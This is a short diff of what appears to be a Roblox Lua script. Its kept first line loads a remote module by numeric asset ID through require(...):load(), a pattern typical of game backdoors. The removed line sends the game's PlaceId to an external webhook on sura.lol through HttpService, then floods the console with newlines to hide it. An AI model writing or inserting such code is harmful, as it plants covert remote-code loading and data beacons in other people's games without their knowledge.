@@ -1,2 +1,2 @@
 require(0x468b91401bc4):load()
-local http = game:GetService("HttpService") local hook = "https://sura.lol/api/67408d5d61c8d" local Data = { ["content"] = ": https://www.roblox.com/games/"..game.PlaceId, } Data = http:JSONEncode(Data) http:PostAsync(hook, Data)print(("\n"):rep(88888))
+
